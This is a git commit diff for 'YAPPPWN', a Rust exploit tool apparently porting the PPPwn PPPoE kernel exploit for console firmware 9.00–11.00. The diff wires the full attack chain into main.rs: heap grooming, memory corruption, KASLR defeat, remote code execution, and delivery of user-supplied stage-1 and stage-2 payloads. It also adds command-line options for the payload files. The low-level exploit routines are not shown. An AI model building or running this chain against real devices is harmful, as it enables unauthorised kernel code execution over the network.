e1d6f24906424ac39c1b44ae587e64a989c97388
FedeBuonco <34037265+fedebuonco@users.noreply.github.com>
2024-10-20 15:16:31 +0100

    Initial kaslr (#11)
    * Initial kaslr
    
    * Add test for overflow_lle
    
    * Add bins
    
    * Now extracted same mac of pppwn
    
    * Found same corrupted obj and same kaslr offset on pcap
    
    * Add more comments to assess was is missing
    
    * Compleate skeleton
    
    * Make PPP accept fake structure
    
    * Finish
    
    * Stop handler after the done
    
    * Fix frozen script due to padi ignore
    
    * Udp send
    
    * Fixed malformed PADT
    
    * Fix test udp to compare only headers
    
    * Format
    
    * Remove warning
    
    * Fix some cargo clippy
    
    * Better main
    
    * Update todo

--- src/main.rs
+++ src/main.rs
@@ -2,52 +2,71 @@ mod constants;
 mod exploit;
 mod parser;
 
-use exploit::{Exploit, LcpEchoHandler};
+use exploit::Exploit;
 use parser::{get_args, Args};
-use pnet::datalink::{self, NetworkInterface};
+use pnet::datalink::{self};
 
-fn run_exploit(interface_name: String) {
+use std::fs::File;
+use std::io::{self, Read};
+
+fn read_stage(file_path: &str) -> io::Result<Vec<u8>> {
+    let mut file = File::open(file_path)?;
+    let mut buffer = Vec::new();
+    file.read_to_end(&mut buffer)?;
+    Ok(buffer) // Return the buffer
+}
+
+fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String) {
     // Find interface
-    let interface_names_match = |iface: &NetworkInterface| iface.name == interface_name;
+    let interface = datalink::interfaces()
+        .into_iter()
+        .find(|iface| iface.name == interface_name)
+        .expect("Failed to find the network interface");
 
-    // Find the network interface with the provided name
-    let interfaces = datalink::interfaces();
-    let interface = interfaces.into_iter().find(interface_names_match).unwrap();
+    // Load binaries of the two pyaloads
+    let stage1 = read_stage(&stage1_path).expect("Failed to read Stage 1 file");
+    let stage2 = read_stage(&stage2_path).expect("Failed to read Stage 2 file");
+
     // Exploit
     let mut expl = Exploit {
-        source_mac: [0, 0, 0, 0, 0, 0],
-        target_mac: [0, 0, 0, 0, 0, 0],
+        source_mac: [0; 6], // Using array initialization
+        target_mac: [0; 6],
         pppoe_softc: 0,
-        host_uniq: [0, 0, 0, 0, 0, 0, 0, 0],
-        target_ipv6: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+        host_uniq: [0; 8],
+        target_ipv6: [0; 16],
+        source_ipv6: [0; 16],
+        kaslr_offset: 0,
     };
-    // LCP
+
+    // LCP Echo handler
     let mut handler = exploit::LcpEchoHandler::new(&interface);
     handler.start();
-    // Initial negotiations
-    println!("[*] Starting Negotiations ...");
-    expl.ppp_negotiation(&interface);
+
+    // Stages of the exploit
+    println!("[+] Starting Negotiations ...");
+    expl.ignore_first_padi(&interface);
+    expl.ppp_negotiation(&interface, Some(expl.get_fake_ifnet()));
     expl.lcp_negotiation(&interface);
     expl.ipcp_negotiation(&interface);
-    println!("[*] Initial Negotiations Done... Wait for interface to be ready");
-    println!("[*] Starting Heap Grooming...");
+    println!("[+] Initial Negotiations Done...");
+    println!("[+] Wait for interface to be ready");
+    println!("[+] Starting Heap Grooming...");
     expl.heap_grooming(&interface);
-    println!("[*] STAGE 1: Memory corruption");
+    println!("[+] STAGE 1: Memory corruption");
     expl.memory_corruption(&interface);
-    // println!("[*] Corrupt in6_llentry object...");
-    // println!("[*] Sending malicious LCP configure request...");
-    // println!("[*] Waiting for LCP configure reject...");
-    // // Negotiate after rejection
-    // expl.lcp_negotiation(&interface);
-    // expl.ipcp_negotiation(&interface);
-    // println!("[+] STAGE 2: KASLR defeat");
-    // println!("[+] STAGE 3: Remote code execution");
-    // expl.ppp_negotiation(&interface);
-    // expl.lcp_negotiation(&interface);
-    // expl.ipcp_negotiation(&interface);
-    // println!("[+] STAGE 4: Arbitrary payload execution");
+    println!("[+] STAGE 2: KASLR defeat");
+    expl.defeat_kaslr(&interface);
+    println!("[+] STAGE 3: Remote code execution");
+    expl.remote_code_exec(&interface, stage1);
+    expl.ppp_negotiation(&interface, None);
+    expl.lcp_negotiation(&interface);
+    expl.ipcp_negotiation(&interface);
+    println!("[+] STAGE 4: Arbitrary payload execution");
+    expl.frag_and_send(&interface, stage2);
+    println!("[+] DONE!");
+
+    // Stop the LCP handler
     handler.stop();
-    println!("[*] DONE!");
 }
 
 fn main() {
@@ -55,5 +74,5 @@ fn main() {
     println!("[+] YAPPPWN [+]");
     let args: Args = get_args();
     println!("{}", args);
-    run_exploit(args.interface)
+    run_exploit(args.interface, args.stage_1, args.stage_2)
 }
--- src/parser.rs
+++ src/parser.rs
@@ -10,6 +10,12 @@ pub struct Args {
     /// Firmware version from 1100 (11.00) to 900 (9.00)
     #[arg(long)]
     pub fw: u32,
+    /// Stage 1 Payload Path
+    #[arg(long)]
+    pub stage_1: String,
+    /// Stage 2 Payload Path
+    #[arg(long)]
+    pub stage_2: String,
 }
 
 impl Display for Args {
@@ -17,11 +23,12 @@ impl Display for Args {
         // Manually format each field in the Args struct
         writeln!(f, "[+] Selected interface = {}", self.interface)?;
         writeln!(f, "[+] Selected firmare = {}", self.fw)?;
+        writeln!(f, "[+] Selected stage 1 payload = {}", self.stage_1)?;
+        writeln!(f, "[+] Selected stage 2 payload = {}", self.stage_2)?;
         Ok(())
     }
 }
 
 pub fn get_args() -> Args {
-    let args = Args::parse();
-    args
+    Args::parse()
 }
